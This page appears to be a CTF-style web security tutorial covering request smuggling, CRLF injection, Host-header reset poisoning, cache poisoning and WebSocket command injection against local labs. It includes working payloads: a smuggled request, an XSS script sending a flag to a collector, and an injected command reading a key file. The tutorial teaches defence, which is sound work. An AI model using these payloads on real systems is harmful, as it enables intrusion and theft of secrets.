@@ -1,0 +1,260 @@
+<!DOCTYPE html><html lang="en"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTTP Protocol Attacks | h5i web security tutorial</title><meta name="description" content="Control raw request framing, inject headers, poison a shared cache, and test commands carried over WebSockets.">
+<meta name="author" content="h5i-dev"><meta name="theme-color" content="#D21C1C">
+<meta name="color-scheme" content="dark"><meta name="robots" content="index, follow, max-image-preview:large">
+<link rel="canonical" href="https://h5i.dev/guides/http-protocol-attacks/"><link rel="icon" type="image/png" href="/_static/logo.png">
+<meta property="og:type" content="article"><meta property="og:site_name" content="h5i">
+<meta property="og:title" content="HTTP Protocol Attacks | h5i web security tutorial"><meta property="og:description" content="Control raw request framing, inject headers, poison a shared cache, and test commands carried over WebSockets.">
+<meta property="og:url" content="https://h5i.dev/guides/http-protocol-attacks/"><meta property="og:image" content="https://h5i.dev/_static/sandboxed-browser-ui.png">
+<meta property="og:image:alt" content="An h5i browser session: the page an AI agent is reading, beside the request log the engine wrote before any bytes moved"><meta property="og:locale" content="en_US">
+<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="HTTP Protocol Attacks | h5i web security tutorial">
+<meta name="twitter:description" content="Control raw request framing, inject headers, poison a shared cache, and test commands carried over WebSockets."><meta name="twitter:image" content="https://h5i.dev/_static/sandboxed-browser-ui.png">
+<meta name="twitter:image:alt" content="An h5i browser session: the page an AI agent is reading, beside the request log the engine wrote before any bytes moved">
+<script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "TechArticle",
+      "headline": "HTTP Protocol Attacks",
+      "description": "Control raw request framing, inject headers, poison a shared cache, and test commands carried over WebSockets.",
+      "author": {
+        "@type": "Organization",
+        "name": "h5i-dev"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "h5i"
+      },
+      "datePublished": "2026-09-15",
+      "dateModified": "2026-09-15",
+      "image": "https://h5i.dev/_static/sandboxed-browser-ui.png",
+      "inLanguage": "en",
+      "isPartOf": {
+        "@id": "https://h5i.dev/#website"
+      },
+      "mainEntityOfPage": "https://h5i.dev/guides/http-protocol-attacks/"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://h5i.dev/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Guides",
+          "item": "https://h5i.dev/guides/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "HTTP Protocol Attacks",
+          "item": "https://h5i.dev/guides/http-protocol-attacks/"
+        }
+      ]
+    }
+  ]
+}</script>
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Archivo:wght@700;800;900&amp;family=Space+Grotesk:wght@300;400;500;700&amp;family=Space+Mono:wght@400;700&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/_static/blog.css?v=20ea6351e0"><link rel="stylesheet" href="/_static/highlight.css?v=45984d5155">
+</head>
+<body><nav class="blog-nav">
+  <a class="nav-logo" href="/"><img src="/_static/logo.png" alt="h5i"><span>h5i</span></a>
+  <ul class="nav-links">
+    <li><a href="/features/">Features</a></li><li><a href="/guides/">Guides</a></li>
+    <li><a href="/manual/">Manual</a></li><li><a href="/blog/">Blog</a></li>
+    <li><a href="https://github.com/h5i-dev/h5i" class="nav-cta">GitHub &rarr;</a></li>
+  </ul>
+</nav><main class="article-wrap"><article class="post">
+<header><div class="post-eyebrow">Tutorial 08 / Protocol &middot; 2026-09-15</div>
+<h1>HTTP Protocol Attacks</h1><p class="post-deck">A beginner-friendly CTF tutorial: control raw request framing, inject headers, poison shared caches, and test commands carried over WebSockets.</p>
+<div class="post-meta"><span>7 min read</span><span>Smuggling &middot; CRLF &middot; Cache poisoning &middot; Labs 30&ndash;34</span></div></header>
+<p>Most earlier labs changed a parameter inside an ordinary HTTP request. Labs 30–34 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a> focus on the layers around it: where a request ends, how headers are constructed, which inputs define a cache entry, and what happens after a page upgrades to a WebSocket.</p>
+<p>We will use <a href="https://github.com/h5i-dev/h5i">h5i</a> to send exact request bytes and WebSocket frames while keeping them inside the same policy and audit trail.</p>
+<p>These techniques can affect other users’ traffic. Use only the included local labs or systems where the rules of engagement explicitly permit them.</p>
+<h2 id="lab-30-http-request-smuggling">Lab 30: HTTP request smuggling</h2>
+<p>A reverse proxy and an application server must agree on where one request ends. If one uses <code>Content-Length</code> while the other uses <code>Transfer-Encoding</code>, the same bytes can describe different message boundaries.</p>
+<p>Start the lab:</p>
+<pre><code class="language-bash">$ ./run.sh 30
+$ h5i browser open 'http://127.0.0.1:9300/health' \
+  --session lab30 --new --capture
+$ WORK=$(mktemp -d)
+</code></pre>
+<p>The edge blocks <code>/admin/*</code>. We will make it see one permitted <code>POST</code>, while the backend sees the end of that request followed by a second request to <code>/admin/flag</code>.</p>
+<p>Create the exact wire message:</p>
+<pre><code class="language-bash">$ python3 - 'http://127.0.0.1:9300' &quot;$WORK/desync.http&quot; &lt;&lt;'PY'
+import sys
+from urllib.parse import urlparse
+
+host = urlparse(sys.argv[1]).netloc
+smuggled = (
+    f&quot;GET /admin/flag HTTP/1.1\r\n&quot;
+    f&quot;Host: {host}\r\n\r\n&quot;
+)
+body = &quot;0\r\n\r\n&quot; + smuggled
+
+outer = (
+    f&quot;POST / HTTP/1.1\r\n&quot;
+    f&quot;Host: {host}\r\n&quot;
+    f&quot;Content-Type: text/plain\r\n&quot;
+    f&quot;Content-Length: {len(body)}\r\n&quot;
+    f&quot;Transfer-Encoding: chunked\r\n&quot;
+    f&quot;\r\n&quot;
+    f&quot;{body}&quot;
+)
+
+open(sys.argv[2], &quot;wb&quot;).write(outer.encode())
+PY
+</code></pre>
+<p>Send the file without reconstructing its framing:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab30 \
+  --raw-request &quot;$WORK/desync.http&quot;
+</code></pre>
+<p>The summary reports only the first response, <code>{"seen": "POST /"}</code>, because that is the one the proxy considers the answer to our request. Both responses arrived on the same connection, so read the stored message to see the second one. Use the <code>seq</code> the replay printed:</p>
+<pre><code class="language-bash">$ h5i websec show res_1 --session lab30 --raw
+</code></pre>
+<p>Two HTTP responses appear back to back, and the second contains <code>FLAG{request_smuggling_clte}</code>. That second response is the whole finding: it is the answer to a request the edge never allowed and never saw.</p>
+<p>This is a CL.TE desynchronization: the proxy trusts <code>Content-Length</code>; the backend trusts chunked encoding. Prevent it by rejecting ambiguous requests, normalizing framing once, and avoiding unsafe reuse of backend connections.</p>
+<p><code>--raw-request</code> is deliberately different from ordinary replay. A normal HTTP client would recompute the very headers we need to test.</p>
+<h2 id="lab-31-crlf-header-injection">Lab 31: CRLF header injection</h2>
+<p>HTTP/1 headers are separated by carriage return and line feed bytes: CRLF, written <code>\r\n</code>. If an application inserts user input into a header without rejecting newlines, the value can end one header and begin another.</p>
+<p>Start the report lab:</p>
+<pre><code class="language-bash">$ ./run.sh 31
+$ h5i browser open 'http://127.0.0.1:9310/' \
+  --session lab31 --new --capture
+</code></pre>
+<p>The front end sends a report name to an internal service and appends <code>X-Role: guest</code>. Insert a new header and end the header block before the application’s own role:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab31 --create \
+  --set method=POST --set path=/api/report \
+  --set header.Content-Type=application/json \
+  --set &quot;json.name=quarterly&quot;$'\r\n'&quot;X-Role: admin&quot;$'\r\n\r\n'
+</code></pre>
+<p>The internal parser sees <code>X-Role: admin</code>; the later guest header falls into the body. The response contains <code>FLAG{crlf_header_injection}</code>.</p>
+<p>Reject CR and LF in values used to construct protocol headers. Prefer APIs that represent headers structurally and refuse invalid bytes rather than composing an HTTP message as text.</p>
+<h2 id="lab-32-host-header-password-reset-poisoning">Lab 32: Host-header password-reset poisoning</h2>
+<p>Applications often need to build an absolute password-reset URL. If the request’s <code>Host</code> header supplies the domain, an attacker can make the emailed link point somewhere else.</p>
+<p>Start the lab:</p>
+<pre><code class="language-bash">$ ./run.sh 32
+$ h5i browser open 'http://127.0.0.1:9320/' \
+  --session lab32 --new --capture --allow 127.0.0.1
+</code></pre>
+<p>Ask for an admin reset while changing the host to the lab’s collector:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab32 --create \
+  --set method=POST --set path=/api/reset \
+  --set header.Content-Type=application/json \
+  --set header.Host=127.0.0.1:9321 \
+  --set json.email=admin@acme.test
+</code></pre>
+<p>The simulated mailbox owner clicks the link, and the collector on port 9321 records the path it was sent to. Read it through the same session:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab32 --create \
+  --set url=http://127.0.0.1:9321/seen \
+  --set header.Host=127.0.0.1:9321
+</code></pre>
+<p>The body is <code>{"seen": ["/api/reset/use?token=&lt;hex&gt;", ...]}</code>. Extract that token and use it:</p>
+<pre><code class="language-bash">$ TOKEN='PASTE_RESET_TOKEN'
+$ h5i websec replay req_0 --session lab32 --create \
+  --set path=/api/reset/use \
+  --set &quot;query.token=$TOKEN&quot;
+</code></pre>
+<p>The response contains <code>FLAG{host_header_reset}</code>.</p>
+<p>Generate security-sensitive absolute URLs from trusted configuration, not <code>Host</code>, <code>X-Forwarded-Host</code>, or similar client-controlled headers. At the edge, allowlist accepted hostnames.</p>
+<h2 id="lab-33-poison-a-shared-cache">Lab 33: poison a shared cache</h2>
+<p>A cache key decides which requests share a stored response. A poisoning opportunity exists when an input changes the response but is absent from that key.</p>
+<p>Start the newsroom lab:</p>
+<pre><code class="language-bash">$ ./run.sh 33
+$ h5i browser open 'http://127.0.0.1:9330/' \
+  --session lab33 --new --capture
+$ ID=&quot;drop$$&quot;
+</code></pre>
+<p>The origin reflects <code>X-Forwarded-Host</code> into the homepage, but the cache keys only on the URL. Create an XSS payload:</p>
+<pre><code class="language-bash">$ PAYLOAD=&quot;x\&quot;&gt;&lt;script&gt;fetch('/admin/flag').then(r=&gt;r.text()).then(t=&gt;fetch('/collect?id=$ID&amp;c='+encodeURIComponent(t)))&lt;/script&gt;&lt;x y=\&quot;&quot;
+</code></pre>
+<p>A single attempt almost never wins. A cache hit never reaches the origin, so our response can only be stored during the moment the entry is expired. Keep repopulating it, and check the collector between rounds:</p>
+<pre><code class="language-bash">$ for _ in $(seq 1 40); do
+    h5i websec replay req_0 --session lab33 \
+      --reset-budget --repeat 5 \
+      --set path=/ \
+      --set &quot;header.X-Forwarded-Host=$PAYLOAD&quot; &gt;/dev/null
+
+    h5i websec replay req_0 --session lab33 --create \
+      --reset-budget \
+      --set path=/collected --set &quot;query.id=$ID&quot; |
+      grep -q 'FLAG' &amp;&amp; break
+
+    sleep 0.6
+  done
+
+$ h5i websec replay req_0 --session lab33 --create \
+  --reset-budget \
+  --set path=/collected --set &quot;query.id=$ID&quot;
+</code></pre>
+<p>When the attacker’s response becomes the cached <code>/</code> entry, the editor’s next reload receives and executes it, and the collector row contains <code>FLAG{cache_poisoning}</code>.</p>
+<p>Test caches by finding inputs that satisfy both conditions:</p>
+<ol>
+<li>changing the input changes the origin response;</li>
+<li>changing the input does not create a different cache entry.</li>
+</ol>
+<p>The cache and origin must agree on every response-varying input. Do not reflect forwarding headers without validation, and avoid caching personalized or executable responses.</p>
+<h2 id="lab-34-command-injection-over-a-websocket">Lab 34: command injection over a WebSocket</h2>
+<p>The visible page in Lab 34 is static. Its operations travel as JSON frames over a WebSocket, so an HTTP-only request history would miss the attack surface.</p>
+<p>Start the lab:</p>
+<pre><code class="language-bash">$ ./run.sh 34
+$ h5i browser open 'http://127.0.0.1:9340/' \
+  --session lab34 --new --capture --allow 127.0.0.1
+</code></pre>
+<p>Learn the frame format with a normal action:</p>
+<pre><code class="language-bash">$ h5i websec socket ws://127.0.0.1:9341/control \
+  --session lab34 \
+  --send '{&quot;action&quot;:&quot;status&quot;}'
+</code></pre>
+<p>The <code>ping</code> action interpolates its <code>host</code> field into a shell command. Add a second command:</p>
+<pre><code class="language-bash">$ h5i websec socket ws://127.0.0.1:9341/control \
+  --session lab34 \
+  --send '{&quot;action&quot;:&quot;ping&quot;,&quot;host&quot;:&quot;10.0.0.1; cat fleet.key&quot;}' \
+  --wait-ms 3000
+</code></pre>
+<p>The returned frame contains <code>FLAG{websocket_injection}</code>.</p>
+<p>WebSocket messages require the same authentication, authorization, schema validation, and injection defenses as HTTP endpoints. Use an argument array rather than a shell for <code>ping</code>, and validate the host as an IP address or hostname.</p>
+<h2 id="a-reusable-protocol-testing-method">A reusable protocol-testing method</h2>
+<p>Ask where two components may disagree:</p>
+<ul>
+<li>proxy versus backend request boundaries;</li>
+<li>application text versus header structure;</li>
+<li>origin response variation versus cache key;</li>
+<li>HTTP-visible pages versus WebSocket-only operations.</li>
+</ul>
+<p>When bytes are the experiment, verify the sent message itself. <code>--raw-request</code> and <code>--raw-target</code> exist because helpful normalization can otherwise erase the payload before it reaches the target.</p>
+<h2 id="summary">Summary</h2>
+<p>Labs 30–34 moved beneath normal parameters. We desynchronized two HTTP parsers, injected a header using CRLF, poisoned a reset link through <code>Host</code>, placed executable content in a shared cache, and carried command injection through a WebSocket frame.</p>
+<pre><code class="language-bash">$ for s in lab30 lab31 lab32 lab33 lab34; do
+    h5i browser close --session &quot;$s&quot;
+  done
+$ rm -rf &quot;$WORK&quot;
+$ ./run.sh stop
+</code></pre>
+<p>In <a href="/guides/logic-time-and-crypto/">Business Logic, Time, and Crypto</a>, we will test the rules around money, time, randomness, authentication state, and serialized objects.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/30-request-smuggling-clte">Lab 30: Request smuggling</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/31-crlf-header-injection">Lab 31: CRLF injection</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/32-host-header-reset">Lab 32: Host-header reset poisoning</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/33-cache-poisoning">Lab 33: Cache poisoning</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/34-websocket-injection">Lab 34: WebSocket injection</a></li>
+</ul>
+
+<a class="next-up" href="/guides/logic-time-and-crypto/"><span class="label">Next in the series</span><h3>Business Logic, Time, and Crypto</h3><p>Race a balance check, stack valid discounts, predict recovery tokens, extend a hash, skip MFA state, and turn a signed cookie into code execution.</p></a>
+<div class="post-cta"><h3>Run the labs yourself</h3><p>42 deliberately vulnerable applications, one binary, no Docker and no accounts.</p>
+<div class="hero-actions"><a class="btn btn-primary" href="https://github.com/h5i-dev/h5i-tutorial">Open h5i-tutorial</a></div></div>
+</article></main><footer class="blog-footer"><div class="blog-footer-inner">
+  <div class="brand">h5i<span class="red"> / high-five</span></div>
+  <nav class="links"><a href="/">Home</a><a href="/guides/">Guides</a><a href="/blog/">Blog</a><a href="/manual/">Manual</a><a href="https://github.com/h5i-dev/h5i">GitHub</a></nav>
+  <div class="legal">Apache 2.0 &middot; Built with Rust</div>
+</div></footer>
+<script src="/_static/blog.js?v=41dbda103a" defer></script><script src="/_static/highlight.js?v=ed81eee4e6" defer></script></body></html>
